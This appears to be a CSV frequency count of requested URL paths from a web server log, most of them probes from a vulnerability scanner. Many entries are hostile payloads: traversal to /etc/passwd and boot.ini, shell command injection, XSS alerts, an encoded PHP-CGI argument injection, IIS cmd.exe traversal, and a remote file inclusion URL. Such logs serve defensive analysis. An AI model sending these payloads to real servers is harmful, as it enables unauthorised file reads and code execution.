Frequency,Resource
1,ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd
1,/vvx500/
2,/www/phpMyAdmin/index.php
1,/cgi-bin/fom.cgi?file=<script>alert('Vulnerable')</script>
1,"/cgi-bin/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3"
1,/ht_root/wwwroot/-/local/httpd$map.conf
1,.cobalt/alert/service.cgi?service=<script>alert('Vulnerable')</script>
1,/cgi-bin/cgiwrap
1,/cgi-bin/campas?%0acat%0a/etc/passwd%0a
1,//cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E
1,calendar/calendar_admin.pl?config=|cat%20/etc/passwd|
1,/nsn/..%5Cutil/dir.bas
1,/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd
1,/webcart/orders/import.txt
1,/albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd
1,/ariadne/
1,/unauthenticated/provisioning/
1,/................../etc/passwd
1,/junk988.aspx
1,/wa.exe
1,html2wml.cgi
2,/claroline/phpMyAdmin/index.php
1,sendtemp.pl?templ=../../../../../../../../../../etc/passwd
1,/cgi-bin/way-board/way-board.cgi?db=/etc/passwd%00
1,/TvLBvkHh.db
1,/help.html
1,/cgi-bin/WS_FTP.ini
2,/index.asp
1,/cfdocs/expeval/sendmail.cfm
1,LWGate
1,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>
1,/forums//adm/config.php
2,cgiwrap/~adm
1,/cgi-bin/scoadminreg.cgi
1,"sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1"
1,/cgi-bin/MsmMask.exe
1,/dms/
2,/web/phpMyAdmin/index.php
1,/vgn/style
1,/cgi-bin/view-source?view-source
1,/cgi-bin/start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
2,/admin/phpmyadmin2/index.php
1,spin_client.cgi?aaaaaaaa
1,/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>
1,/index.php?sql_debug=1
1,/cisco/
143,index.html
1,ezboard.cgi
1,/cgi-bin/pals-cgi?palsAction=restart&documentName=/etc/passwd
2,/hostadmin/?page='
1,/recordings/theme/iefixes.css
1,/TvLBvkHh.dtd
1,/megabook/admin.cgi?login=<script>alert('Vulnerable')</script>
1,/vgn/license
1,/cgi-bin/com5.pl
1,view-source?view-source
1,/basilix/mbox-list.php3
1,//profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/basilix/compose-attach.php3
1,/securecontrolpanel/
1,/cgi-bin/mt-static/mt-load.cgi
1,/polycomvvx/
1,/vgn/asp/MetaDataUpdate
1,/ws_ftp.ini
1,/html/cgi-bin/cgicso?query=AAA
1,publisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&output_number=10
1,/ows-bin/
1,/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>
1,/scripts/db4web_c.exe/dbdirname/c:%5Cboot.ini
1,/interscan/
1,/forum/admin/wwforum.mdb
1,search.pl?Realm=All&Match=0&Terms=test&nocpp=1&maxhits=10&;Rank=<script>alert('Vulnerable')</script>
1,fom.cgi?file=<script>alert('Vulnerable')</script>
1,/support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.LCDispatcher
1,/index.php?|=../../../../../../../../../etc/passwd
1,/cgi-bin/cgiwrap/~ZA3Z1
1,/TvLBvkHh.render_css
1,/TvLBvkHh.orig
1,faqmanager.cgi?toc=/etc/passwd%00
1,/scozbook/view.php?PG=whatever
1,/cgi-bin/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.blt
1,finger
1,/.cobalt/sysManage/../admin/.htaccess
1,/~/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx?aspxerrorpath=null
1,/w-agora/
1,/TvLBvkHh.et
1,/TvLBvkHh.nlm
1,/Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html
1,/TvLBvkHh.es
1,/SIPCfg
1,/TvLBvkHh.txt
1,/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>
1,/phprov/
1,/phpmyadmin
1,/TvLBvkHh.sqlite
2,/%22%3Cscript%3Ealert(%22xss%22)%3C/script%3E
1,/WS_FTP.ini
1,/search/SQLQHit.asp
1,mgrqcgi
1,/cgi-bin/ezman.cgi
1,generate.cgi?content=../../../../../../../../../../winnt/win.ini%00board=board_1
1,/DB4Web/10.10.10.10:100
1,book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
1,/TvLBvkHh.iso8859-2
1,/TvLBvkHh.vts
1,/TvLBvkHh.iso8859-8
1,"sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3"
2,cgiwrap/~mysql
1,/cgi-bin/download.cgi
2,/cgi-bin/cgiwrap/~noaccess
1,admin/setup.cgi
1,/cgi-bin/webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/config/
1,/newuser?Image=../../database/rbsserv.mdb
1,/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1
1,/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;
1,/TvLBvkHh.xbb
1,multihtml.pl?multi=/etc/passwd%00html
1,"/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>"
1,/kboard/
1,/hmstat.htm
1,/cgi-bin/dcshop/orders/orders.txt
1,update.dpgs
1,/PMA2/index.php
1,"viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\""><script>alert('Vulnerable')</script>;"
1,/cgi-bin/htgrep?file=index.html&hdr=/etc/passwd
1,/~/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx
1,/502/
1,technote/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=/../../../../../../../../../../etc/passwd
1,/TvLBvkHh.ee
1,bb-hist?HISTFILE=../../../../../../../../../../etc/passwd
1,/php/php.exe?c:\winnt\boot.ini
1,/users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/TvLBvkHh.iso2022-jp
1,/cgi-bin/csChatRBox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/TvLBvkHh.phpp
1,/cgi-bin/lwgate.cgi
1,.
1,/cgi-bin/nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/webmail/
1,"/index.php?file=Liens&op=\""><script>alert('Vulnerable');</script>"
1,/ISSamples/SQLQHit.asp
1,/pafiledb/includes/team/file.php
1,/cgi-bin/emumail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-bin/quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=
1,/cgi-bin/redirect
1,/cgi-bin/bb-hist?HISTFILE=../../../../../../../../../../etc/passwd
1,/ows/restricted.show
1,mt-static/mt-check.cgi
1,/TvLBvkHh.tcl
1,/cgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|
1,/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../boot.ini%00
5,/phpmyadmin/_scripts/setup.php
1,htsearch?-c/nonexistant
1,/shopping400.mdb
1,Count.cgi
1,"tst.bat%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/cgi-bin/architext_query.pl
1,/_cti_pvt/
1,/cgi-bin/html2wml.cgi
1,/cfdocs/cfcache.map
4,/index.action
1,/cgi-bin/admin/admin.cgi
1,/TvLBvkHh.php=
1,/admin-serv/config/admpw
1,/TvLBvkHh.php3
1,/simplebbs/users/users.php
1,infosrch.cgi
1,/TvLBvkHh.php4
1,/cgi-bin/.cobalt
1,/TvLBvkHh.php+
1,/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>
1,cgiwrap/%3Cfont%20color=red%3E
1,/TvLBvkHh.axd
1,/cgi-bin/mkilog.exe
1,/TvLBvkHh.render_warning_screen
4,/wls-wsat/CoordinatorPortType
3,/muieblackcat
1,/com
1,/cgi-bin/ezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../../../../../../../etc/passwd&distinct=1
1,/cgi-bin/erba/start/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/vgn/vr/Select
1,/cgi-bin/sscd_suncourier.pl
1,/index.php?page=../../../../../../../../../../boot.ini
1,/cgi-bin/DCShop/auth_data/auth_user_file.txt
1,/jgb_eng_php3/cfooter.php3
1,simple/view_page?mv_arg=|cat%20/etc/passwd|
1,/cgi-bin/loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/TvLBvkHh.passwd
1,/index.do
1,/lpt9
1,pollit/Poll_It_SSI_v2.0.cgi?data_dir=\etc\passwd%00
1,csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,ezman.cgi
1,/error/500error.jsp?et=1<script>alert('Vulnerable')</script>;
1,/cgi-bin/horde/test.php?mode=phpinfo
1,/tftpphone/
1,/anthill/login.php
1,/cgi-bin/dcshop/auth_data/auth_user_file.txt
1,guestbook.pl
1,/cgi-bin/lwgate
1,/config.php
1,/cgi-bin/calendar.pl
1,/cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah
1,/cgi-bin/mt/mt.cfg
1,/TvLBvkHh.jsp+
1,/home.php?arsc_language=elvish
1,/phpwebfilemgr/index.php?f=../../../../../../../../../etc
1,"/emailfriend/emailnews.php?id=\""<script>alert(document.cookie)</script>"
1,/cutenews/index.php?debug
1,/server/
1,/htbin/
1,/catalog.nsf
1,/TvLBvkHh.conf
1,/officescan/cgi/cgiChkMasterPwd.exe
1,/SiteServer/Admin/commerce/foundation/DSN.asp
1,/put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../../etc/passwd
1,/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.INC
1,/search.asp?term=<%00script>alert('Vulnerable')</script>
1,/cgi-bin/boozt/admin/index.cgi?section=5&input=1
1,/nsn/..%5Cwebdemo/env.bas
1,/cgi-bin/ImageFolio/admin/admin.cgi
1,/webcart/carts/
1,hello.bat?&dir+c:\\
1,moin.cgi?test
1,/TvLBvkHh.pt
1,/sips/sipssys/users/a/admin/user
1,loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/blah_badfile.shtml
1,/phpmyadmin2/index.php
1,/mail.box
1,/index.aspx%5C
1,/index.php/content/search/?SectionID=3&SearchText=<script>alert(document.cookie)</script>
1,/admin/browse.asp?FilePath=c:\&Opt=2&level=0
2,/cgi-bin/cgiwrap/~web
5,/PhpMyAdmin/scripts/setup.php
1,input.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/index.php/%5C%22%3E%3Cscript%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C
1,/cgi-bin/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,/TvLBvkHh.dk
1,/TvLBvkHh.pwd
1,/cgi-bin/banner.cgi
1,redir.exe?URL=http%3A%2F%2Fwww%2Egoogle%2Ecom%2F%0D%0A%0D%0A%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3C%2FSCRIPT%3E
1,/TvLBvkHh.it
1,/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd
1,/tiki/tiki-install.php
1,/nsn/..%5Cutil/set.bas
1,/edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd
1,/TvLBvkHh.password
1,/TvLBvkHh.ca
1,/Config1.htm
1,whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
1,"/cgi-bin/sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1"
1,nph-error.pl
2,/cgi-bin/cgiwrap/~smtp
1,pals-cgi?palsAction=restart&documentName=/etc/passwd
1,/search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script>
1,perl?-v
1,/gb/index.php?login=true
1,/cgi-bin/ss
1,/TvLBvkHh.cs
1,/TvLBvkHh.utf8
1,/s9sCh.csp
1,/cgi.cgi/
1,formmail.cgi
1,/cgi/
1,/phpmyadmin/config.php
1,/forums/config.php
1,/instantwebmail/message.php
1,/app/provision/
1,"/search/index.cfm?<script>alert(\""Vulnerable\"")</script>"
1,/addressbook/index.php?name=<script>alert('Vulnerable')</script>
1,redirect
2,/default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
1,/cgi-bin/spin_client.cgi?aaaaaaaa
1,/TvLBvkHh.js
1,/cgi-bin/betsie/parserl.pl/%3Cscript%3Ealert('Vulnerable')%3C/script%3E;
1,/Xcelerate/LoginPage.html
1,/node/view/666%5C%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
1,/TvLBvkHh.thtml
2,cgiwrap/~noaccess
1,/cgi-bin/aglimpse.cgi
1,/cgi-bin/dbman/db.cgi?db=no-db
1,/shopa_sessionlist.asp
1,/WEB-INF./web.xml
1,/nsn/..%5Cweb/fdir.bas
1,ezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../../../../../../../etc/passwd&distinct=1
1,/TvLBvkHh.fr
1,test-cgi.tcl
1,compatible.cgi
1,/cgi-bin/common/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|
1,/scripts/samples/search/filetime.idq
1,/profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/cgi-bin/14all.cgi?cfg=../../../../../../../../etc/passwd
2,/cgi-bin/cgiwrap/~smmsp
1,/TvLBvkHh.btr
1,/TvLBvkHh.old
1,/exchange/lib/PUBFLD.INC
1,classified.cgi
1,/phpEventCalendar/file_upload.php
1,/cgi-bin/calendar
1,/index.php?action=storenew&username=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.cp866
2,cgiwrap/~guest
2,//MyAdmin/scripts/setup.php
1,com5..........................................................................................................................................................................................................................box
1,/cgi-bin/stats/statsbrowse.asp?filepath=c:\&Opt=3
1,/phpMyadmin_bak/index.php
1,/../../../../../../../etc/passwd
1,/cbms/usersetup.php
1,/smg_Smxcfg30.exe?vcc=3560121183d3
1,/xml/
1,/TvLBvkHh.html
1,/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink
1,/SiteServer/Admin/knowledge/persmbr/VsPrAuoEd.asp
1,/cgi-bin/archie
1,/cgi-bin/test-cgi?/*
1,/webMathematica/MSP?MSPStoreID=..\..\..\..\..\..\..\..\..\..\boot.ini&MSPStoreType=image/gif
1,erba/start/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/cgi-bin/badmin.cgi
1,/vgn/ac/data
1,/cgi-bin/awstats.pl
1,/upload.asp
1,/supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
2,/login.asp
1,/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.mdb+
1,/viewpage.php?file=/etc/passwd
1,input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,webmap.cgi
1,"/emailfriend/emailarticle.php?id=\""<script>alert(document.cookie)</script>"
1,/phpping/index.php?pingto=www.test.com%20|%20dir%20c:\\
1,/digium/
1,/phptonuke.php?filnavn=/etc/passwd
2,/login.aspx
2,/cgi-bin/pbcgi.cgi?Nikto=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/cgi-bin/ws_ftp.ini
1,data/fetch.php?page=
1,/cgi-bin/loadpage.cgi?user_id=1&file=../../../../../../../../../../etc/passwd
2,/cgi-bin/cgiwrap/~operator
1,common/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|
1,/spip/
1,/cgi-bin/mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00
2,/cgi-bin/cart.pl?db='
2,/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c
1,/cgi-bin/webplus.exe?about
1,/TvLBvkHh.cgi
1,/SQLQHit.asp
1,gm.cgi
1,/script%3Ealert('Vulnerable')%3C/script%3E.cfm
1,/grandstream/
1,/PLCM/
1,/cgi-bin/way-board.cgi?db=/etc/passwd%00
1,/cgi-bin-sdb/printenv
1,/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.shtml
2,/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>
1,/exchange/lib/GETWHEN.INC
1,/search?NS-query-pat=../../../../../../../../../../etc/passwd
1,/scripts/samples/search/filesize.idq
1,/cgi-bin/mrtg.cfg?cfg=../../../../../../../../etc/passwd
1,/cgi-bin/sendtemp.pl?templ=../../../../../../../../../../etc/passwd
1,/default.asp
1,/USER/CONFIG.AP
1,LWGate.cgi
1,/TvLBvkHh.xsql
2,cart.pl?db='
1,/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello
1,/vgn/stylepreviewer
1,empower?DB=whateverwhatever
2,atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?
1,/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd
3,///
1,/default.htm
1,/cgi-win/
2,cgiwrap/~smmsp
1,anacondaclip.pl?template=../../../../../../../../../../etc/passwd
1,Pbcgi.exe
1,/TvLBvkHh.apw
1,//../../../../../../../../../../boot.ini
1,/TvLBvkHh.notes
1,cachemgr.cgi
1,/cfdocs/snippets/evaluate.cfm
1,/SiteServer/admin/
1,/Admin_files/order.log
1,/vgn/record/previewer
1,newsdesk.cgi?t=../../../../../../../../../../etc/passwd
13,/manager/html
1,/gxp280/
1,/fcgi-bin/
1,campas?%0acat%0a/etc/passwd%0a
1,/cgi-bin/smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,/cbms/editclient.php
1,/modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>
1,/cgi-bin/nph-error.pl
1,cgiemail-1.4/cgicso?query=AAA
1,/TvLBvkHh.SSIFilter
1,boozt/admin/index.cgi?section=5&input=1
1,/tftpserver/
1,/doc/webmin.config.notes
1,/cgi-bin/moin.cgi?test
1,/blah123.php
1,/iissamples/issamples/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/cgi-bin/csLiveSupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/web.config
2,cgiwrap/~unknown
1,/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.types
1,/cgi-bin/echo.bat
1,/cgi-bin/search
1,/guestbook/admin/o12guest.mdb
1,/cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|
1,/cgi-bin/ibill.pm
1,emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/default.php?error_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E
1,/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>
1,"/ldap/cgi-bin/ldacgi.exe?Action=<script>alert(\""Vulnerable\"")</script>"
1,/%25a%25s%25p%25d
1,/getaccess
3,/%5C/
1,query?mss=%2e%2e/config
1,/SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp
1,/TvLBvkHh.phtml
1,/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
1,/nsn/..%5Cutil/userlist.bas
1,/hola/admin/cms/htmltags.php?datei=./sec/data.php
1,/TvLBvkHh.snp
1,/TvLBvkHh.php3+
1,"/servlet/CookieExample?cookiename=<script>alert(\""Vulnerable\"")</script>"
1,WS_FTP.ini
1,/eng/start/StatPtrGen.htm
1,/vgn/ac/esave
1,YaBB.pl?board=news&action=display&num=../../../../../../../../../../etc/passwd%00
1,testcgi.exe
1,/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.config~
1,/nsn/..%5Cutil/type.bas
1,/cgi-bin/foxweb.dll
1,/guestbook/admin.php
1,/provisioning/
